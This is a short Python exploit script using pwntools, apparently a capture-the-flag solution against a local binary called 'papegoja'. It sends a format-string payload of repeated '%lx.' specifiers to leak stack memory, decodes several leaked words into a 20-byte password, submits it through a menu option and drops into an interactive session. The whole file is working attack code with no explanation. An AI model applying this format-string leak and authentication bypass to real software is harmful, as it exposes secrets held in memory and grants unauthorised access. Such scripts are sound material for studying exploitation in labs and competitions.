#!/usr/bin/env python3

from pwn import *
import struct

io = process('./papegoja')

io.recvuntil(b'> ')
io.sendline(b'1')
io.recvuntil(b'> ')
io.sendline(b'%lx.'*20)
io.recvuntil(b'Polly says: ')
say = io.recvline()
log.info('Leak: %s', say)

say = say.strip().decode().split('.')[9:12]
say = [int(x, 16) for x in say]
say = [x.to_bytes(8, 'little') for x in say]
say = b''.join(say)[:20].decode()

log.info('Password: %s', say)

io.recvuntil(b'> ')
io.sendline(b'2')
io.recvuntil(b'> ')
io.sendline(say.encode())

io.interactive()
